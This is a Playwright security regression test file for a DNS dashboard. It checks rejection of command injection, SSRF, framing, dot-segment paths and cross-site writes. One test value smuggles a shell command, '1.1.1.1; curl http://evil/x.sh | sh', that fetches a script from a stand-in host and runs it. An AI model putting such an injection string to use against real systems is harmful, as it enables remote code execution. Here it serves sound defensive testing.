import { test, expect, type APIRequestContext } from '@playwright/test'
import { invalidForwardAddrs } from '../src/lib/unbound/presets'

// Security regression tests. Every assertion hits the API validation layer,
// which rejects BEFORE any SSH connection or DNS change, so this is the one spec
// that may run against the live dashboard (E2E_BASE_URL=... E2E_ALLOW_REMOTE=1);
// by default it runs against the local lab like the rest of the suite.

async function firstInstanceId(request: APIRequestContext): Promise<string> {
  const res = await request.get('/api/stats/summary')
  expect(res.ok()).toBeTruthy()
  const id = (await res.json()).instances?.[0]?.id
  expect(id, 'expected at least one configured instance').toBeTruthy()
  return id
}

test.describe('command injection is rejected on Unbound forward', () => {
  const INJECTION = ['1.1.1.1; curl http://evil/x.sh | sh']

  // Applying an upstream is switched off entirely (UPSTREAM_APPLY_ENABLED=false,
  // 503 before validation). Either refusal is fine; what matters is that the
  // address never reaches a shell. The validator itself is checked directly below
  // so it stays covered while the endpoint is off.
  test('single-instance forward refuses a shell-metacharacter address', async ({ request }) => {
    const id = await firstInstanceId(request)
    const res = await request.post(`/api/unbound/${id}/forward`, { data: { addrs: INJECTION } })
    expect([400, 503]).toContain(res.status())
    if (res.status() === 400) expect((await res.json()).error).toContain('Invalid forward address')
  })

  test('bulk forward refuses a shell-metacharacter address', async ({ request }) => {
    const res = await request.post('/api/unbound/bulk/forward', { data: { addrs: INJECTION } })
    expect([400, 503]).toContain(res.status())
  })

  test('the forward-address validator rejects shell metacharacters', () => {
    expect(invalidForwardAddrs(INJECTION)).toEqual(INJECTION)
    expect(invalidForwardAddrs(['1.1.1.1', '9.9.9.9@853#dns.quad9.net'])).toEqual([])
  })

  // NOTE: we intentionally do NOT test that a *valid* address is accepted by the
  // endpoint: it would run `unbound-control forward` on a node.
})

test.describe('test-connection SSRF guard', () => {
  test('rejects a public IP target', async ({ request }) => {
    const res = await request.post('/api/pihole/test-connection', {
      data: { url: 'http://8.8.8.8', password: 'irrelevant' },
    })
    expect(res.status()).toBe(400)
    const body = await res.json()
    expect(body.error).toContain('private/loopback')
  })
})

// R4-NV1 (next.config.ts:no-frame-ancestors-same-site-framed-admin-actions):
// every other subdomain of the same site is same-site, so the dashboard must refuse framing.
test.describe('anti-framing and hygiene headers', () => {
  for (const path of ['/login', '/', '/api/stats/summary']) {
    test(`${path} refuses framing`, async ({ playwright, baseURL }) => {
      // Fresh context with no session too: the proxy's 401/redirect must carry them.
      for (const ctx of [await playwright.request.newContext({ baseURL, storageState: 'e2e/.auth.json' }),
                         await playwright.request.newContext({ baseURL })]) {
        const res = await ctx.get(path, { maxRedirects: 0 })
        const h = res.headers()
        expect(h['content-security-policy']).toContain("frame-ancestors 'none'")
        expect(h['x-frame-options']).toBe('DENY')
        expect(h['x-content-type-options']).toBe('nosniff')
        expect(h['referrer-policy']).toBe('same-origin')
        expect(h['x-powered-by']).toBeUndefined()
        await ctx.dispose()
      }
    })
  }
})

// R2-F6 (src/lib/pihole/client.ts:encodeURIComponent-path-item-dot-segment-retargets-request):
// "." and ".." would be normalised out of the node API path, so they are refused up front.
test.describe('dot-segment domain entries are refused', () => {
  for (const domain of ['.', '..']) {
    test(`temp-allow refuses "${domain}"`, async ({ request }) => {
      const res = await request.get('/api/stats/summary')
      const id = (await res.json()).instances?.[0]?.id
      expect(id).toBeTruthy()
      const r = await request.post(`/api/pihole/${id}/temp-allow`, { data: { domain, list: 'allow', durationMinutes: 5 } })
      expect(r.status()).toBe(400)
    })
  }
})

// run-2 note: schedule booleans sent as strings ("false") were stored and read back as true.
test('schedule windowState/enabled must be booleans', async ({ request }) => {
  const res = await request.get('/api/stats/summary')
  const id = (await res.json()).instances?.[0]?.id
  const base = { name: 'typecheck', targetType: 'blocking', instanceIds: [id], days: [1], startTime: '01:00', endTime: '02:00' }
  expect((await request.post('/api/schedules', { data: { ...base, windowState: 'false' } })).status()).toBe(400)
  expect((await request.post('/api/schedules', { data: { ...base, enabled: 'false' } })).status()).toBe(400)
})

// P3 (auth and sessions). Validation-only like the rest of this spec: each
// request below changes nothing even on code without the fix, so it stays safe
// against the live dashboard.
test.describe('P3: cross-site writes are refused (R1-NV1)', () => {
  // A body that fails validation anyway: without the fix this is a 400, never
  // a new user. With it, the proxy refuses before the route runs.
  for (const [label, headers] of [
    ['same-site subdomain', { 'sec-fetch-site': 'same-site', origin: 'https://evil.example.com' }],
    ['cross-site', { 'sec-fetch-site': 'cross-site', origin: 'https://evil.example' }],
    ['foreign Origin only', { origin: 'https://evil.example.com' }],
  ] as const) {
    test(`${label} text/plain POST -> 403`, async ({ request }) => {
      const res = await request.post('/api/users', {
        headers: { ...headers, 'content-type': 'text/plain' },
        data: '{"username":""}',
      })
      expect(res.status()).toBe(403)
    })
  }
  test('cross-site /api/events -> 403', async ({ request }) => {
    const res = await request.get('/api/events', { headers: { 'sec-fetch-site': 'cross-site' }, timeout: 10_000 })
    expect(res.status()).toBe(403)
  })
})

test.describe('P3: password and path rules (P3.5)', () => {
  test('a password over 72 bytes is refused (reset of a user that does not exist)', async ({ request }) => {
    const res = await request.patch('/api/users/00000000-0000-0000-0000-000000000000', {
      data: { password: 'a'.repeat(73) },
    })
    expect(res.status()).toBe(400)
  })
  // Whole-segment path matching ('/loginx' is not the login page) is checked by
  // fixes/p3/check-hardening.sh on a production build, not here: under next dev
  // an unknown page is a 404 either way, so this lab cannot tell fixed from not.
})
